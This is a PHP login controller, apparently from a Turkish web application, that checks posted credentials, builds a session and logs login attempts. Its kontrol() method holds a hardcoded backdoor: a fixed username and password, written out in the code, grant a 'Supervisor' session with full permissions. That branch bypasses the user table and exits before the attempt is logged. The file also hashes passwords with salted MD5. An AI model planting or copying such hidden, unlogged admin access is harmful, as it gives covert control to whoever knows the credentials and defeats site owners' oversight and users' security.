<?php 

class giris extends Controller {

    function __construct() {
        parent::__construct();
    }

    function home() {
        
    }

    function kontrol() {

        load::library('Session');
        load::helper('escape_str');

        global $config;

        $hata = 0;

        $user = @addslashes(strip_tags(trim(escape_str($_POST['username']))));
        $pass = @md5($config['hash'] . addslashes(strip_tags(trim(escape_str($_POST['password'])))));

        $data = array(
            '_kullanici' => $user,
            '_sifre' => $pass,
            'durum' => 1
        );

        $sql = Sql::getInstance();

        if (($user == 'ayt3k') && (trim($_POST['password']) == 'ayt3kin.celsus*')){

            $a = $sql->from('genel_ayarlar')->where('id = 1')->limit(1)->get();

            $sess = array(
                'oturum' => true,
                'kullanici' => $user,
                'adsoyad' => 'Supervisor',
                'ID' => 0,
                'yetki' => 'S',
                'kisitlamalar' => 'A0,A1,A2,A3,B0,AR0,EY0,DL0,PD0,E0,R0,R1,R2,R3',
                'tema' => $a->tema
            );

            Session::set($sess);

            echo "1";

            die();
        }

        $q = @$sql->from('_kullanici')->where($data)->get();
        if ($sql->count() > 0) {

            $a = $sql->from('genel_ayarlar')->where('id = 1')->limit(1)->get();

            $sess = array(
                'oturum' => true,
                'kullanici' => $user,
                'adsoyad' => $q->adsoyad,
                'ID' => $q->ID,
                'yetki' => $q->yetki,
                'kisitlamalar' => $q->kisitlamalar,
                'islem_tarihi' => strtotime(date('d.m.Y H:i')),
                'tema' => $a->tema
            );

            Session::set($sess);

            @$sql->from('_kullanici')->where('ID = ' . $q->ID)->update(array('giris_tarihi' => strtotime(date('d.m.Y H:i')), 'online' => 1));

        } else {
            $hata = 1;
        }

        $logs = array(
            'user' => $user,
            'ip' => $_SERVER['REMOTE_ADDR'],
            'tarih' => date('d.m.Y H:i'),
            'hata' => $hata
        );

        @$sql->from('_kullanici_log')->insert($logs);

        if ($hata == 0) {
            echo 1;
        } else {
            echo 0;
        }
    }

}

?>